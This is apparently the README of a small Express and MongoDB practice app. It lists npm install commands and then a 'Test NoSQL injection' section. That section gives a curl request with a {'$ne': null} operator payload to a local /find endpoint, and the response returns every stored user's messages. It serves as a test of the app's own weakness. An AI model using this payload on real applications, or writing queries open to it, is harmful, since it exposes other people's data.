# myExpressApp3
## installation
 npm i body-parser --save 
 npm install mongoose --save
 npm install http
 npm install ejs 
 npm install body-parser
 npm install cookie-parser

## Test NoSQL injection
```
curl -X POST http://localhost:5000/find http://localhost:5000/find -H "Content-type: application/json" -d '{"username":{"$ne": null}}' 
{"messages":[{"_id":"630da011fc502d944531c4c7","username":"yuuki","message":"test","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630da02cfc502d944531c4ca","username":"nagomi","message":"test2","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630da044fc502d944531c4cd","username":"kento","message":"test3","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630dad73605af45b21ad8cd8","username":"yuuki","message":"test","date":"2022-08-30T06:25:28.476Z","__v":0},{"_id":"630dd39f4f17c70c97bd4047","username":"Michiko","message":"test4","date":"2022-08-30T09:08:21.303Z","__v":0},{"_id":"630df0cea19ba14ada1e1b5c","username":"{$ne:null}","message":"test","date":"2022-08-30T10:51:43.866Z","__v":0},{"_id":"630f1a3b999afe4a9252a7dd","username":"yuuki","message":"This is a test.","date":"2022-08-31T08:21:13.852Z","__v":0}]}{"messages":[{"_id":"630da011fc502d944531c4c7","username":"yuuki","message":"test","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630da02cfc502d944531c4ca","username":"nagomi","message":"test2","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630da044fc502d944531c4cd","username":"kento","message":"test3","date":"2022-08-30T05:28:28.421Z","__v":0},{"_id":"630dad73605af45b21ad8cd8","username":"yuuki","message":"test","date":"2022-08-30T06:25:28.476Z","__v":0},{"_id":"630dd39f4f17c70c97bd4047","username":"Michiko","message":"test4","date":"2022-08-30T09:08:21.303Z","__v":0},{"_id":"630df0cea19ba14ada1e1b5c","username":"{$ne:null}","message":"test","date":"2022-08-30T10:51:43.866Z","__v":0},{"_id":"630f1a3b999afe4a9252a7dd","username":"yuuki","message":"This is a test.","date":"2022-08-31T08:21:13.852Z","__v":0}]}%         
```
